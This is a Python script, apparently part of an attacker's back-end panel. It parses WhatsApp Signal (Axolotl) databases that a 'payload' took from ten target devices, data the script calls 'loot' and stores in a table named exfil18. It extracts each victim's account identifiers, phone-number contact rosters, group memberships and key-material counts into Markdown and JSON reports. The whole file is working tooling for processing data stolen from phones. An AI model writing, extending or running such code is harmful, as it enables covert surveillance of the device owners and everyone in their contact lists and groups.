#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
axolotl_top10_md.py —— Top10 设备 Axolotl 库提取 → Markdown 报告
  提取内容（全部为库内明文/关联索引，非消息明文）：
    · 账号自身标识（lid / 手机号）
    · 联系人/设备名册（RECIPIENTJID 手机号 + ACCOUNTJIDSTRING lid + 时间）
    · 加密会话统计（会话数/状态/分组 scope）
    · 群组参与（GROUPID 列表 + 成员数）
    · 密钥材料统计（identity/prekey/senderkey/signedprekey）
  输出：docs/axolotl_top10_<ts>.md
用法: python3 tools/axolotl_top10_md.py
"""
import sys, os, json, base64, sqlite3, tempfile, time, subprocess
from collections import Counter, defaultdict

BASE = '/www/wwwroot/i.131422.com'
PG_CFG = json.load(open(os.path.join(BASE, 'adm888app', 'data', 'pg.json')))

TOP10 = ['KQJQNCJQ0N', 'FXVHF7YHFQ', 'VWPMK99RM9', 'KMGWFDW36G', 'GYW49K75DD',
         'HPWKLW57WH', 'QFW70H17YP', 'DV6LG10M0F0X', 'LMWPHM4Y0Q', 'GP2LDYF6G9']


def pg_query(sql):
    env = dict(os.environ, PGPASSWORD=PG_CFG['password'])
    r = subprocess.run(['psql', '-h', '127.0.0.1', '-U', 'panel', '-d', 'panel', '-t', '-A', '-F', '\x1f', '-c', sql],
                       capture_output=True, text=True, env=env, timeout=600)
    out = []
    for line in r.stdout.strip().split('\n'):
        if line.strip():
            out.append(line.split('\x1f'))
    return out


def get_best_bin(serial):
    # 【取最大库】同设备可能有多个 Axolotl 快照（不同时间/不同容器），取字节数最大的
    rows = pg_query("SELECT bin_path FROM exfil18 WHERE serial='%s' AND data->>'path' ILIKE '%%Axolotl%%' AND bin_path IS NOT NULL" % serial.replace("'", "''"))
    best, bestsz = None, -1
    for r in rows:
        try:
            sz = os.path.getsize(r[0])
            if sz > bestsz: best, bestsz = r[0], sz
        except Exception:
            continue
    return best


def analyze(bp):
    buf = base64.b64decode(json.load(open(bp, encoding='utf-8', errors='ignore'))['data'])
    fd, tmp = tempfile.mkstemp(suffix='.sqlite'); os.close(fd)
    open(tmp, 'wb').write(buf)
    con = sqlite3.connect(tmp); cur = con.cursor()
    res = {'size': len(buf)}
    try:
        # 账号自身（从任意一行拿 ACCOUNTJIDSTRING）
        cur.execute("SELECT DISTINCT ZACCOUNTJIDSTRING FROM ZWAAXOLOTLIDENTITY WHERE ZACCOUNTJIDSTRING IS NOT NULL LIMIT 20")
        res['account_lids'] = [r[0] for r in cur.fetchall() if r[0]]

        # 联系人名册：recipient JID（手机号）+ device + 时间
        cur.execute("""SELECT ZRECIPIENTJID, ZACCOUNTJIDSTRING, ZDEVICEID, ZTIMESTAMP, ZIDENTITYTRUSTED
                       FROM ZWAAXOLOTLIDENTITY ORDER BY ZTIMESTAMP DESC""")
        contacts = []
        seen = set()
        for jid, lid, dev, ts, trusted in cur.fetchall():
            if not jid or jid in seen:
                continue
            seen.add(jid)
            contacts.append({'jid': jid, 'lid': lid or '', 'dev': dev or 0, 'ts': ts or 0, 'trusted': trusted or 0})
        res['contacts'] = contacts

        # 本机自身号码（recipient 里排除掉自己的 lid 关联）
        res['own_numbers'] = []

        # 会话统计
        cur.execute("SELECT count(*), count(DISTINCT ZRECIPIENTJID), sum(CASE WHEN ZSTATE=1 THEN 1 ELSE 0 END) FROM ZWAAXOLOTLSESSION")
        res['sessions'] = cur.fetchone()

        # 群组
        cur.execute("SELECT ZGROUPID, count(DISTINCT ZRECIPIENTJID) FROM ZWASENDERKEY WHERE ZGROUPID IS NOT NULL GROUP BY ZGROUPID ORDER BY 2 DESC")
        res['groups'] = [{'gid': g, 'members': n} for g, n in cur.fetchall() if g]

        # 密钥材料
        for t, k in [('ZWAAXOLOTLIDENTITY', 'identity'), ('ZWAPREKEY', 'prekey'), ('ZWASENDERKEY', 'senderkey'),
                     ('ZWASIGNEDPREKEY', 'signedprekey'), ('ZWAPOSTQUANTUMPREKEY', 'pqprekey')]:
            try:
                cur.execute(f"SELECT count(*) FROM '{t}'")
                res[k] = cur.fetchone()[0]
            except Exception:
                res[k] = 0
    finally:
        con.close()
        try: os.unlink(tmp)
        except Exception: pass
    return res


def main():
    lines = []
    ts = time.strftime('%Y-%m-%d %H:%M')
    lines.append('# Axolotl.sqlite Top10 设备提取报告\n')
    lines.append(f'- 生成时间：{ts}')
    lines.append('- 数据源：`loot/*/ext_stats_*.bin`（payload 提取的 WhatsApp Signal 会话库）')
    lines.append('- 提取内容：设备账号标识 / 联系人名册 / 群组 / 加密会话 / 密钥材料统计\n')
    lines.append('| # | 设备 | 库大小 | 加密会话 | 联系人/设备 | 群组数 | 群成员对 | identity | prekey | senderkey |')
    lines.append('|---|------|--------|----------|-------------|--------|----------|----------|--------|-----------|')
    details = []
    for i, serial in enumerate(TOP10, 1):
        bp = get_best_bin(serial)
        if not bp or not os.path.exists(bp):
            lines.append(f'| {i} | {serial} | — | — | — | — | — | — | — | — |')
            continue
        try:
            a = analyze(bp)
        except Exception as e:
            lines.append(f'| {i} | {serial} | 解析失败 | — | — | — | — | — | — | — |')
            continue
        sess, sess_u, sess_act = a['sessions']
        gm = sum(g['members'] for g in a['groups'])
        lines.append(f"| {i} | `{serial}` | {a['size']//1024} KB | {sess} | {len(a['contacts'])} | {len(a['groups'])} | {gm} | {a['identity']} | {a['prekey']} | {a['senderkey']} |")
        details.append((serial, a))

    lines.append('\n---\n')
    for serial, a in details:
        lines.append(f'## 设备 `{serial}`\n')
        if a.get('account_lids'):
            lines.append(f"**账号标识（lid）**：{', '.join('`%s`' % x for x in a['account_lids'][:6])}")
            lines.append('')
        lines.append(f"**加密会话**：{a['sessions'][0]} 条（活跃状态 {a['sessions'][2]}） · **联系人/设备**：{len(a['contacts'])} · **群组**：{len(a['groups'])} · **群成员对**：{sum(g['members'] for g in a['groups'])}")
        lines.append('')
        if a['contacts']:
            lines.append('**联系人名册（按会话时间倒序，前 40）**：\n')
            lines.append('| 手机号 / JID | 关联 lid | 设备ID | 信任 |')
            lines.append('|--------------|----------|--------|------|')
            for c in a['contacts'][:40]:
                lines.append(f"| `{c['jid']}` | `{c['lid'][:28]}` | {c['dev']} | {'✅' if c['trusted'] else '—'} |")
            lines.append('')
        if a['groups']:
            lines.append('**群组（前 15）**：\n')
            lines.append('| 群 ID | 成员数 |')
            lines.append('|-------|--------|')
            for g in a['groups'][:15]:
                lines.append(f"| `{g['gid']}` | {g['members']} |")
            lines.append('')

    out = os.path.join(BASE, 'docs', 'axolotl_top10_%s.md' % time.strftime('%Y%m%d_%H%M'))
    open(out, 'w', encoding='utf-8').write('\n'.join(lines))
    # 同时存原始 JSON（完整数据）
    js = os.path.join(BASE, 'docs', 'axolotl_top10_%s.json' % time.strftime('%Y%m%d_%H%M'))
    json.dump({s: a for s, a in details}, open(js, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print('MD:', out)
    print('JSON:', js)
    print('设备数:', len(details))


if __name__ == '__main__':
    main()
